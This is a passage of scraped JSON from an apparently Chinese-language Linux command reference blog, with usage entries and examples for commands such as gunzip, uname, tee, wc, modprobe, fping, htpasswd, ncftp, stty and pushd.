首先将/etc目录下的所有文件以及子目录进行压缩，备份压缩包 etc.zip 到/opt目录，然后对 etc.zip 文件进行 gzip 压缩，设置 gzip 的压缩级别为 9。 zip –r /opt/etc.zip /etc gzip -9v /opt/etc.zip 查看上述 etc.zip.gz 文件的压缩信息。 gzip -l /opt/etc.zip.gz compressed uncompressed ratio uncompressed_name 11938745 12767265 6.5% /opt/etc.zip 解压上述 etc.zip.gz 文件到当前目录。 [root@mylinux ~]#gzip –d /opt/etc.zip.gz 或者执行 [root@mylinux ~]#gunzip /opt/etc.zip.gz 通过上面的示例可以知道gzip –d等价于gunzip命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gunzip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gunzip/","stats":{"text":"3 min read","time":128000,"words":551,"minutes":3},"date":"2022-02-02 05:22:53","dateFormat":"2022-02-02"},{"content":"打印系统信息。。 概要 uname [OPTION]... 主要用途 打印机器和操作系统的信息。 当没有选项时，默认启用 -s 选项。 如果给出多个选项或 -a 选项时，输出信息按以下字段排序：内核名称 主机名称 内核 release 内核版本机器名称 处理器 硬件平台 操作系统。 选项 -a, --all 按顺序打印全部信息，如果 -p 和 -i 的信息是未知，那么省略。 -s, --kernel-name 打印内核名称。 -n, --nodename 打印网络节点主机名称。 -r, --kernel-release 打印内核release。 -v, --kernel-version 打印内核版本。 -m, --machine 打印机器名称。 -p, --processor 打印处理器名称。 -i, --hardware-platform 打印硬件平台名称。 -o, --operating-system 打印操作系统名称。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 # 单独使用uname命令时相当于uname -s [root@localhost ~]# uname Linux # 查看全部信息 [root@localhost ~]# uname -a Linux localhost 2.6.18-348.6.1.el5 #1 SMP Tue May 21 15:34:22 EDT 2013 i686 i686 i386 GNU/Linux # 分别列出信息 [root@localhost ~]# uname -m i686 [root@localhost ~]# uname -n localhost [root@localhost ~]# uname -r 2.6.18-4-686 [root@localhost ~]# uname -s Linux [root@localhost ~]# uname -v #1 SMP Tue May 21 15:34:22 EDT 2013 [root@localhost ~]# uname -p i686 [root@localhost ~]# uname -i i386 [root@localhost ~]# uname -o GNU/Linux 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 uname，info coreutils 'uname invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uname/","stats":{"text":"2 min read","time":99000,"words":380,"minutes":2},"date":"2022-02-02 05:22:10","dateFormat":"2022-02-02"},{"content":"从标准输入读取数据并重定向到标准输出和文件。。 概要 tee [OPTION]... [FILE]... 主要用途 需要同时查看数据内容并输出到文件时使用。 参数 FILE（可选）：要输出的文件，可以为一或多个。 选项 长选项与短选项等价 -a, --append 追加到文件中而不是覆盖。 -i, --ignore-interrupts 忽略中断信号（Ctrl+c中断操作无效）。 -p 诊断写入非管道的错误。 --output-error[=MODE] 设置写错误时的行为，请查看下方的MODE部分。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 MODE决定了当出现写错误时的输出行为，可用的MODE如下： 'warn' 当写入到任何输出报错时诊断。 'warn-nopipe' 当写入到任何输出（而不是管道）报错时诊断。 'exit' 当写入到任何输出报错时退出。 'exit-nopipe' 当写入到任何输出（而不是管道）报错时退出。 -p选项的指定的默认MODE为'warn-nopipe'。 当'--output-error'没有在选项中时，默认的操作是当写入到管道报错时立刻退出，诊断错误信息并写入到非管道输出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 # 将进程信息通过管道输出到标准输出（终端）并覆盖写入到文件中。 ps -ef |tee info_a.log info_b.log # 将进程信息通过管道输出到标准输出（终端）并追加写入到文件中。 ps -ef |tee -a info_a.log info_b.log 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 tee或info coreutils 'tee invocation'。 存在缓存机制，每 1024 个字节将输出一次。若从管道接收输入数据，应该是缓冲区满，才将数据转存到指定的文件中。若文件内容不到 1024 个字节，则接收从标准输入设备读入的数据后，将刷新一次缓冲区，并转存数据到指定文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tee","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tee/","stats":{"text":"2 min read","time":114000,"words":523,"minutes":2},"date":"2022-02-02 05:21:36","dateFormat":"2022-02-02"},{"content":"创建字符设备文件和块设备文件。 补充说明 mknod 命令用于创建 Linux 中的字符设备文件和块设备文件。 语法 mknod (选项) (参数) 选项 -Z：设置安全的上下文； -m：设置权限模式； -help：显示帮助信息； --version：显示版本信息。 参数 文件名：要创建的设备文件名； 类型：指定要创建的设备文件的类型； 主设备号：指定设备文件的主设备号； 次设备号：指定设备文件的次设备号。 实例 ls -la /dev/ttyUSB* crw-rw—- 1 root dialout 188, 0 2008-02-13 18:32 /dev/ttyUSB0 mknod /dev/ttyUSB32 c 188 32 扩展知识 Linux 的设备管理是和文件系统紧密结合的，各种设备都以文件的形式存放在/dev 目录 下，称为设备文件。应用程序可以打开、关闭和读写这些设备文件，完成对设备的操作，就像操作普通的数据文件一样。 为了管理这些设备，系统为设备编了号，每 个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux 有约定俗成的编 号，如硬盘的主设备号是 3。 Linux 为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构 struct file_operations。这个数据结构中包括许多操作函数的指针，如 open()、close()、read() 和 write() 等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations 结构体中的成员为一系列的接口函数，如用于读/写的 read/write 函数和用于控制的 ioctl 等。 打开一个文件就是调用这个文件 file_operations 中的 open 操作。不同类型的文件有不同的 file_operations 成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作； 而对于各种设备文件，则最终调用各自驱动程序中的 I/O 函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的 I/O 接口。所以 file_operations 是文件层次的 I/O 接口。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mknod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mknod/","stats":{"text":"3 min read","time":131000,"words":607,"minutes":3},"date":"2022-02-02 05:21:01","dateFormat":"2022-02-02"},{"content":"统计文件的字节数、字数、行数。 补充说明 wc 命令统计指定文件中的字节数、字数、行数，并将统计结果显示输出。利用 wc 指令我们可以计算文件的 Byte 数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则 wc 指令会从标准输入设备读取数据。wc 同时也给出所指定文件的总统计数。 语法 wc(选项)(参数) wc [选项]... [文件]... wc [选项]... --files0-from=F 选项 -c # 统计字节数，或--bytes或——chars：只显示Bytes数。 -l # 统计行数，或——lines：只显示列数。 -m # 统计字符数。这个标志不能与 -c 标志一起使用。 -w # 统计字数，或——words：只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。 -L # 打印最长行的长度。 -help # 显示帮助信息 --version # 显示版本信息 参数 文件：需要统计的文件列表。 例子 wc -l * # 统计当前目录下的所有文件行数及总计行数。 wc -l *.js # 统计当前目录下的所有 .js 后缀的文件行数及总计行数。 find . * | xargs wc -l # 当前目录以及子目录的所有文件行数及总计行数。 查看文件的字节数、字数、行数 wc test.txt # 输出结果 7 8 70 test.txt # 行数 单词数 字节数 文件名 用 wc 命令怎么做到只打印统计数字不打印文件名 wc -l &lt; test.txt # 输出结果 7 用来统计当前目录下的文件数 (不包含隐藏文件) # 要去除TOTAL行 expr $(ls -l | wc -l) - 1 # 输出结果 8 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"wc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/wc/","stats":{"text":"2 min read","time":95000,"words":430,"minutes":2},"date":"2022-02-02 05:19:57","dateFormat":"2022-02-02"},{"content":"将 DOS 格式文本文件转换成 Unix 格式。 补充说明 dos2unix 命令用来将 DOS 格式的文本文件转换成 UNIX 格式的（DOS/MAC to UNIX text file format converter）。DOS 下的文本文件是以\\r\\n作为断行标志的，表示成十六进制就是 0D 0A。而 Unix 下的文本文件是以\\n 作为断行标志的，表示成十六进制就是 0A。DOS 格式的文本文件在 Linux 底下，用较低版本的 vi 打开时行尾会显示^M，而且很多命令都无法很好的处理这种格式的文件，如果是个 shell 脚本，。而 Unix 格式的文本文件在 Windows 下用 Notepad 打开时会拼在一起显示。因此产生了两种格式文件相互转换的需求，对应的将 UNIX 格式文本文件转成成 DOS 格式的是 unix2dos 命令。 语法 dos2unix [-hkqV] [-c convmode] [-o file ...] [-n infile outfile ...] 选项 -k：保持输出文件的日期不变 -q：安静模式，不提示任何警告信息。 -V：查看版本 -c：转换模式，模式有：ASCII, 7bit, ISO, Mac, 默认是：ASCII。 -o：写入到源文件 -n：写入到新文件 参数 参数：需要转换到文件。 实例 最简单的用法就是 dos2unix 直接跟上文件名： dos2unix file 如果一次转换多个文件，把这些文件名直接跟在 dos2unix 之后。（注：也可以加上-o参数，也可以不加，效果一样） dos2unix file1 file2 file3 dos2unix -o file1 file2 file3 上面在转换时，都会直接在原来的文件上修改，如果想把转换的结果保存在别的文件，而源文件不变，则可以使用-n参数。 dos2unix oldfile newfile 如果要保持文件时间戳不变，加上-k参数。所以上面几条命令都是可以加上-k参数来保持文件时间戳的。 dos2unix -k file dos2unix -k file1 file2 file3 dos2unix -k -o file1 file2 file3 dos2unix -k -n oldfile newfile 转换当前目录下所有文件 find -type f | xargs dos2unix ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dos2unix","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dos2unix/","stats":{"text":"2 min read","time":118000,"words":509,"minutes":2},"date":"2022-02-02 05:18:30","dateFormat":"2022-02-02"},{"content":"解压 rar 文件命令，从 rar 档案中提取文件。 语法 unrar [选项][switch 命令] [文件名...][路径] unrar &lt;command&gt; [-&lt;switch 1&gt; -&lt;switch N&gt;] archive [files...] [path...] 选项 -e #将文件解压缩到当前目录。 -l # 列出存档内容。 -p #将文件打印到标准输出。 -t #测试存档文件。 -v #详细列出存档。 -x #使用完整路径提取文件。 SWITCHES 开关设置 注意：每个开关必须用空格分隔。你不能把它们放在一起。 -av- #禁用真实性验证检查。 -c- #禁用评论显示 -f #刷新文件 -kb #保留破碎的提取文件 -ierr #将所有消息发送给stderr。 -inul #禁用所有消息。 -o+ #覆盖现有文件。 -o- #不要覆盖现有文件 -p&lt;password&gt; #设置密码。 -p- #不查询密码 -r #递归子目录。 -u #更新文件。 -v #列出所有卷。 -x&lt;file&gt; #排除指定的文件。 -x@&lt;list&gt; #排除指定列表文件中的文件。 -x@ #读取要从stdin中排除的文件名。 -y #对所有查询都假设为是。 参数 目录：指定要显示列表的目录，也可以是具体的文件。 实例 将压缩文件 text.rar 在当前目录下解压缩,并解压完整路径。 unrar x test.rar ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unrar","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unrar/","stats":{"text":"2 min read","time":76000,"words":328,"minutes":2},"date":"2022-02-02 05:15:19","dateFormat":"2022-02-02"},{"content":"自动处理可载入模块。 补充说明 modprobe 命令用于智能地向内核中加载模块或者从内核中移除模块。 modprobe 可载入指定的个别模块，或是载入一组相依的模块。modprobe 会根据 depmod 所产生的相依关系，决定要载入哪些模块。若在载入过程中发生错误，在 modprobe 会卸载整组的模块。 语法 modprobe (选项) (参数) 选项 -a 或--all：载入全部的模块； -c 或--show-conf：显示所有模块的设置信息； -d 或--debug：使用排错模式； -l 或--list：显示可用的模块； -r 或--remove：模块闲置不用时，即自动卸载模块； -t 或--type：指定模块类型； -v 或--verbose：执行时显示详细的信息； -V 或--version：显示版本信息； -help：显示帮助。 参数 模块名：要加载或移除的模块名称。 实例 查看 modules 的配置文件： modprobe -c 这里，可以查看 modules 的配置文件，比如模块的 alias 别名是什么等。会打印许多行信息，例如其中的一行会类似如下： alias symbol:ip_conntrack_unregister_notifier ip_conntrack 列出内核中所有已经或者未挂载的所有模块： modprobe -l 这里，我们能查看到我们所需要的模块，然后根据我们的需要来挂载； 其实modprobe -l读取的模块列表就位于/lib/modules/uname -r目录中； 其中uname -r是内核的版本，例如输出结果的其中一行是： /lib/modules/2.6.18-348.6.1.el5/kernel/net/netfilter/xt_statistic.ko 挂载 vfat 模块： modprobe vfat 这里，使用格式modprobe 模块名来挂载一个模块。挂载之后，用 lsmod 可以查看已经挂载的模块。模块名是不能带有后缀的，我们通过modprobe -l所看到的模块，都是带有.ko或.o后缀。 移除已经加载的模块： modprobe -r 模块名 这里，移除已加载的模块，和 rmmod 功能相同。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"modprobe","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/modprobe/","stats":{"text":"2 min read","time":111000,"words":495,"minutes":2},"date":"2022-02-02 05:15:02","dateFormat":"2022-02-02"},{"content":"fping 检测主机是否存在。 补充说明 fping 命令 fping 类似于 ping，但比 ping 强大。与 ping 要等待某一主机连接超时或发回反馈信息不同，fping 给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时 ping，fping 还可以在命令行中指定要 ping 的主机数量范围。 语法 fping (选项) (参数) 选项 -a # 显示存活的主机 -b # ping 数据包的大小。（默认为56） -c # ping每个目标的次数 (默认为1) -f # 从文件获取目标列表(不能与 -g 同时使用) -l # 循环发送ping -g # 通过指定开始和结束地址来生成目标列表,可以使网段 -u # 显示不可到达的目标 实例 安装 fping 命令： # 先安装epel源： yum install epel* -y # 安装fping包： yum install fping -y 选择性 ping 指定 ip： ~]# fping 192.168.0.1 192.168.0.125 192.168.0.126 2&gt;/dev/null 192.168.0.1 is alive 192.168.0.125 is alive 192.168.0.126 is unreachable ping 整个网段： ~]# fping -g 192.168.0.0/24 2&gt;/dev/null 192.168.0.1 is alive 192.168.0.103 is alive ... 192.168.0.253 is unreachable 192.168.0.254 is unreachable ping 整个网段，只显示存活的主机： ~]# fping -ag 192.168.0.0/24 2&gt;/dev/null 192.168.0.1 192.168.0.103 ... ping 某一段 ip： ~]# fping -ag 192.168.0.5 192.168.0.130 2&gt;/dev/null 192.168.0.103 ... 192.168.0.125 192.168.0.130 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fping","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fping/","stats":{"text":"2 min read","time":101000,"words":371,"minutes":2},"date":"2022-02-02 05:14:05","dateFormat":"2022-02-02"},{"content":"从目录堆栈中删除目录。。 概要 popd [-n] [+N | -N] 主要用途 从目录堆栈中删除目录，如果是顶部目录被删除，那么当前工作目录会切换到新的顶部目录。 没有参数时，删除目录堆栈顶部。 选项 -n 抑制删除目录引起的当前工作目录变化。 参数 +N（可选）：不带参数执行dirs命令显示的列表中，左起的第 N 个目录将被删除。（从 0 开始计数） -N（可选）：不带参数执行dirs命令显示的列表中，右起的第 N 个目录将被删除。（从 0 开始计数） 返回值 返回成功除非提供了非法选项或执行出现错误。 例子 # 添加目录到堆栈，当前工作目录不变。 [user2@pc ~]$ dirs ~ [user2@pc ~]$ pushd -n ~/Desktop ~ ~/Desktop [user2@pc ~]$ pushd -n ~/Pictures ~ ~/Pictures ~/Desktop [user2@pc ~]$ pushd -n ~/bin ~ ~/bin ~/Pictures ~/Desktop # 从目录堆栈中删除目录，删除顶部目录时会改变当前工作目录： [user2@pc ~]$ popd -2 ~ ~/Pictures ~/Desktop [user2@pc ~]$ popd +1 ~ ~/Desktop [user2@pc ~]$ popd ~/Desktop [user2@pc Desktop]$ # 从目录堆栈中删除目录，删除顶部目录时不会改变当前工作目录： [user2@pc ~]$ dirs ~ [user2@pc ~]$ pushd -n ~/Desktop ~ ~/Desktop [user2@pc ~]$ popd -n ~ [user2@pc ~]$ 注意 bash的目录堆栈命令包括dirs popd pushd。 当前目录始终是目录堆栈的顶部。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"popd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/popd/","stats":{"text":"2 min read","time":86000,"words":365,"minutes":2},"date":"2022-02-02 05:13:31","dateFormat":"2022-02-02"},{"content":"用来探测给定文件的类型。 补充说明 file 命令用来探测给定文件的类型。file 命令对文件的检查分为文件系统、魔法幻数检查和语言检查 3 个过程。 语法 file (选项) (参数) 选项 -b：列出辨识结果时，不显示文件名称； -c：详细显示指令执行过程，便于排错或分析程序执行的情形； -f&lt;名称文件&gt;：指定名称文件，其内容有一个或多个文件名称时，让 file 依序辨识这些文件，格式为每列一个文件名称； -L：直接显示符号连接所指向的文件类别； -m&lt;魔法数字文件&gt;：指定魔法数字文件； -v：显示版本信息； -z：尝试去解读压缩文件的内容。 参数 文件：要确定类型的文件列表，多个文件之间使用空格分开，可以使用 shell 通配符匹配多个文件。 实例 显示文件类型 [root@localhost ~]# file install.log install.log: UTF-8 Unicode text [root@localhost ~]# file -b install.log &lt;== 不显示文件名称 UTF-8 Unicode text [root@localhost ~]# file -i install.log &lt;== 显示MIME类别。 install.log: text/plain; charset=utf-8 [root@localhost ~]# file -b -i install.log text/plain; charset=utf-8 显示符号链接的文件类型 [root@localhost ~]# ls -l /var/mail lrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -&gt; spool/mail [root@localhost ~]# file /var/mail /var/mail: symbolic link to `spool/mail' [root@localhost ~]# file -L /var/mail /var/mail: directory [root@localhost ~]# file /var/spool/mail /var/spool/mail: directory [root@localhost ~]# file -L /var/spool/mail /var/spool/mail: directory ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"file","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/file/","stats":{"text":"2 min read","time":100000,"words":391,"minutes":2},"date":"2022-02-02 05:12:57","dateFormat":"2022-02-02"},{"content":"apache 服务器创建密码认证文件。 补充说明 htpasswd 命令是 Apache 的 Web 服务器内置工具，用于创建和更新储存用户名、域和用户基本认证的密码文件。 语法 htpasswd (选项) (参数) 选项 -c：创建一个加密文件； -n：不更新加密文件，只将加密后的用户名密码显示在屏幕上； -m：默认采用 MD5 算法对密码进行加密； -d：采用 CRYPT 算法对密码进行加密； -p：不对密码进行进行加密，即明文密码； -s：采用 SHA 算法对密码进行加密； -b：在命令行中一并输入用户名和密码而不是根据提示输入密码； -D：删除指定的用户。 参数 用户：要创建或者更新密码的用户名； 密码：用户的新密码。 实例 利用 htpasswd 命令添加用户 htpasswd -bc .passwd www.example.com php 在 bin 目录下生成一个.passwd 文件，用户名 www.example.com，密码：php，默认采用 MD5 加密方式。 在原有密码文件中增加下一个用户 htpasswd -b .passwd Jack 123456 去掉-c选项，即可在第一个用户之后添加第二个用户，依此类推。 不更新密码文件，只显示加密后的用户名和密码 htpasswd -nb Jack 123456 不更新.passwd 文件，只在屏幕上输出用户名和经过加密后的密码。 利用 htpasswd 命令删除用户名和密码 htpasswd -D .passwd Jack 利用 htpasswd 命令修改密码 htpasswd -D .passwd Jackhtpasswd -b .passwd Jack 123456 即先使用 htpasswd 删除命令删除指定用户，再利用 htpasswd 添加用户命令创建用户即可实现修改密码的功能。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"htpasswd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/htpasswd/","stats":{"text":"2 min read","time":96000,"words":432,"minutes":2},"date":"2022-02-02 05:10:20","dateFormat":"2022-02-02"},{"content":"显示与设定硬件时钟。 补充说明 hwclock 命令是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。 在 Linux 中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在 BIOS 画面设定的时钟。系统时钟则是指 kernel 中的时钟。当 Linux 启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有 Linux 相关指令与函数都是读取系统时钟的设定。 语法 hwclock (选项) 选项 --adjust：hwclock 每次更改硬件时钟时，都会记录在/etc/adjtime 文件中。使用--adjust 参数，可使 hwclock 根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟； --debug：显示 hwclock 执行时详细的信息； --directisa：hwclock 预设从/dev/rtc 设备来存取硬件时钟。若无法存取时，可用此参数直接以 I/O 指令来存取硬件时钟； --hctosys：将系统时钟调整为与目前的硬件时钟一致； --set --date=&lt;日期与时间&gt;：设定硬件时钟； --show：显示硬件时钟的时间与日期； --systohc：将硬件时钟调整为与目前的系统时钟一致； --test：仅测试程序，而不会实际更改硬件时钟； --utc：若要使用格林威治时间，请加入此参数，hwclock 会执行转换的工作； --version：显示版本信息。 实例 设置硬件时间要依赖于操作系统时间，具体方法如下： hwclock –systohc hwclock --systohc –-utc 不加任何参数使用 hwclock，可以查看当前的硬件日期和时间。 hwclock 查看 clock 文件，确认是否设置了 UTC： cat /etc/default/rcS UTC=yes 在其他一些版本的 Linux（如 RebHat）中可以这样查看： cat /etc/sysconfig/clock ZONE=&quot;America/Los_Angeles&quot; UTC=false ARC=false ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hwclock","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hwclock/","stats":{"text":"2 min read","time":115000,"words":522,"minutes":2},"date":"2022-02-02 05:09:39","dateFormat":"2022-02-02"},{"content":"是增强的的 FTP 工具。 补充说明 ncftp 命令是增强的的 ftp 工具，比传统的 FTP 指令更加强大。FTP 让用户得以下载存放于服务器主机的文件，也能将文件上传到远端主机放置。ncftp 是文字模式 FTP 程序的佼佼者，它具备多样特色，包括显示传输速率，下载进度，自动续传，标住书签，可通过防火墙和代理服务器等。 语法 ncftp (选项) (参数) 选项 -u：指定登录 FTP 服务器时使用的用户名； -p：指定登录 FTP 服务器时使用的密码； -P：如果 FTP 服务器没有使用默认的 TCP 协议的 21 端口，则使用此选项指定 FTP 服务器的端口号。-m：在传之前尝试在目录位置创建目录 (用于传目录的情况)-R：递规传子目录 参数 FTP 服务器：指定远程 FTP 服务器的 ip 地址或主机名。 安装 安装 wget ftp://ftp.ncftp.com/ncftp/ncftp-3.2.3-src.tar.gz tar zxvf ncftp-3.2.3-src.tar.gz cd ncftp-3.2.3/ ./configure --prefix=/usr/local/ncftp make &amp;&amp; make install 实例 将本地/etc/目录内的所有文件和目录，上传到 FTP 服务器的 flv/games/目录内 (如果不存在 flv/games/目录则自动创建)。 /usr/local/ncftp/bin/ncftpput -u koumm -p koumm -P 21 -m -R 192.168.162.137 flv/games/ /etc/* 指令说明 ncftp 的基本命令和普通 ftp 一样，可以输入 help 获得命令列表。对于所有的命令，都可以使用 help &lt;命令&gt; 的格式获得详细帮助。l 开头的就是对本地执行的命令，其它的就是对登入的 ftp 服务目录的操作命令。 增加的本地文件系统的操作命令： lls: 列出本地当前目录文件； lmkdir : 本地建立目录； lrename: 本地文件改名； lpwd: 显示当前本地路 径； lchmod: 改变本地文件权限； lpage: 显示本地文件内容； lrm: 删除本地文件； lrmdir: 删除本地目录。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ncftp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ncftp/","stats":{"text":"3 min read","time":121000,"words":521,"minutes":3},"date":"2022-02-02 05:08:57","dateFormat":"2022-02-02"},{"content":"获取 Linux 内核模块的详细信息。 补充说明 get_module 命令用于获取 Linux 内核模块的详细信息。 语法 get_module 模块名 实例 使用 lsmod 命令查看内核模块： lsmod | head -5 Module Size Used by ipv6 272801 15 xfrm_nalgo 13381 1 ipv6 crypto_api 12609 1 xfrm_nalgo ip_conntrack_ftp 11569 0 使用 get_module 命令查看模块详细信息： get_module ipv6 refcnt : 15 srcversion : 8CC9C024755B4483E56C0EF Parameters: autoconf : 1 disable : 0 disable_ipv6 : 0 Sections: .altinstr_replacement : 0xf8f1a3cf .altinstructions : 0xf8f1d03c .bss : 0xf8f36000 .data.read_mostly : 0xf8f34d20 .data : 0xf8f2f7a0 .exit.text : 0xf8f1a234 .gnu.linkonce.this_module : 0xf8f34e00 .init.data : 0xf8a16a60 .init.text : 0xf8a16000 .module_sig : 0xf8f37960 .rodata.str1.1 : 0xf8f1ae46 .rodata : 0xf8f1a420 .smp_locks : 0xf8f1d150 .strtab : 0xf8f29840 .symtab : 0xf8f24000 .text : 0xf8ef5000 __kcrctab : 0xf8f1de70 __kcrctab_gpl : 0xf8f1d9cc __ksymtab : 0xf8f1dd78 __ksymtab_gpl : 0xf8f1d954 __ksymtab_strings : 0xf8f1da44 __param : 0xf8f1da08 __versions : 0xf8f1df00 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"get_module","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/get_module/","stats":{"text":"1 min read","time":47000,"words":154,"minutes":1},"date":"2022-02-02 05:08:27","dateFormat":"2022-02-02"},{"content":"修改终端命令行的相关设置。 补充说明 stty 命令修改终端命令行的相关设置。 语法 stty (选项) (参数) 选项 -a：以容易阅读的方式打印当前的所有配置； -g：以 stty 可读方式打印当前的所有配置。 参数 终端设置：指定终端命令行的设置选项。 实例 在命令行下，禁止输出大写的方法： stty iuclc #开启 stty -iuclc #恢复 在命令行下禁止输出小写： stty olcuc #开启 stty -olcuc #恢复 打印出终端的行数和列数： stty size 改变 Ctrl + D 的方法: stty eof &quot;string&quot; 系统默认是 Ctrl+D 来表示文件的结束，而通过这种方法，可以改变！ 屏蔽显示： stty -echo #禁止回显 stty echo #打开回显 测试方法: stty -echo;read;stty echo;read 忽略回车符： stty igncr #开启 stty -igncr #恢复 定时输入： timeout_read() { timeout=$1 old_stty_settings=`stty -g` #save current settings stty -icanon min 0 time 100 #set 10seconds,not 100seconds eval read varname #=read $varname stty &quot;$old_stty_settings&quot; #recover settings } 更简单的方法就是利用 read 命令的-t选项： read -t 10 varname ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"stty","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/stty/","stats":{"text":"2 min read","time":68000,"words":280,"minutes":2},"date":"2022-02-02 05:07:10","dateFormat":"2022-02-02"},{"content":"将目录添加到目录堆栈顶部。。 概要 pushd [-n] [+N | -N | dir] 主要用途 将目录添加到目录堆栈顶部，切换当前工作目录到该目录。 旋转目录堆栈，使堆栈的新顶部成为当前工作目录。 没有参数时，交换目录堆栈的前两个目录。 选项 -n 抑制添加目录引起的当前工作目录变化。 参数 +N（可选）：不带参数执行dirs命令显示的列表中，左起的第 N 个目录将作为堆栈顶部，在它前面的会移动到底部。（从 0 开始计数） -N（可选）：不带参数执行dirs命令显示的列表中，右起的第 N 个目录将作为堆栈顶部，在它前面的会移动到底部。（从 0 开始计数） dir（可选）：要推送的目录。 返回值 返回成功除非提供了非法选项或执行出现错误。 例子 # 添加目录到堆栈，改变了当前工作目录。 [user2@pc ~]$ dirs ~ [user2@pc ~]$ pushd ~/Desktop ~/Desktop ~ [user2@pc Desktop]$ # 添加目录到堆栈，当前工作目录不变。 [user2@pc ~]$ dirs ~ [user2@pc ~]$ pushd -n ~/Desktop ~ ~/Desktop [user2@pc ~]$ pushd -n ~/Pictures ~ ~/Pictures ~/Desktop # 调整顺序。 [user2@pc ~]$ pushd +1 ~/Pictures ~/Desktop ~ [user2@pc ~]$ pushd -1 ~/Desktop ~ ~/Pictures [user2@pc ~]$ pushd ~ ~/Desktop ~/Pictures 注意 bash的目录堆栈命令包括dirs popd pushd。 当前目录始终是目录堆栈的顶部。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pushd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pushd/","stats":{"text":"2 min read","time":85000,"words":370,"minutes":2},"date":"2022-02-02 05:06:25","dateFormat":"2022-02-02"},{"content":"产生随机的排列。。 概要 shuf [OPTION]... [FILE]shuf -e [OPTION]... [ARG]...shuf -i LO-HI [OPTION]... 主要用途 将输入的内容随机排列并输出。 当没有文件或文件为-时，读取标准输入。 选项 -e, --echo 将每个ARG视为输入行。 -i, --input-range=LO-HI 将数字范围LO（最低）到HI（最高）之间的作为输入行。 -n, --head-count=COUNT 只输出前COUNT行。 -o, --output=FILE 将结果写入到文件而不是标准输出。 